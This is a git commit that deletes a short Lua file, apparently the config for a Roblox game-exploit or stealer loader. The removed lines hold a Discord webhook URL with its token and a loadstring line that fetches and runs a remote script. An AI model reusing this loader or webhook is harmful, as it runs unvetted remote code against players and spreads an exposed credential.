1d4eeb35b3c1599a4ff492be15ef45c5125fd760
Muhammad6186 <90974141+CreakyTunic@users.noreply.github.com>
2023-01-14 19:19:28 +0800

    Delete Man.lua

--- main/Man.lua
+++
@@ -1,5 +0,0 @@
-UserName = "antaigen333"
-WebHook  = "https://discord.com/api/webhooks/952523092360589353/zh-VR64MVMMCe7bqti1t3JuW6_oIlQv672U_lDHLCJOjZSvA2qWr4KBx1CZAUk0MCd4U"
-Mention  = true
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/PSX.lua'))()
